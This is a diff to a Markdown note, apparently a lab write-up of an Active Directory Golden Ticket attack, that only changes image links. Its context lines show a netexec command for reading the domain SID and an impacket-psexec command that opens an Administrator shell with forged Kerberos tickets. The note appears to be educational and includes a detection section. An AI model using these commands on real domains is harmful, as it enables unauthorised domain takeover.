@@ -6,7 +6,7 @@ From Powershell:`Get-ADDomain | Select-Object DomainSID`
 ![[Get Domain SID.png|548]]
 
 From kali: `nxc ldap $IP -u "evil.user" -p "Password123" --get-sid`
-![Description(Screenshots/Kali linux Netexec.png|601)]
+![Description(Screenshots/Kali linux Netexec.png)]
 
 **Attack**
 
@@ -21,7 +21,7 @@ Exporting the Ticket for later use.
 
 Getting a shell as the Administrator user.
 `impacket-psexec -k -no-pass -dc-ip $IP redteam.local/Administrator@AD-DC01.redteam.local`
-![[Active Directory/Golden Ticket/screenshots/Kali linux impacket.png]]
+![Description(Active Directory/Golden Ticket/Screenshots/Kali linux impacket.png)]
 
 
 **Detection**
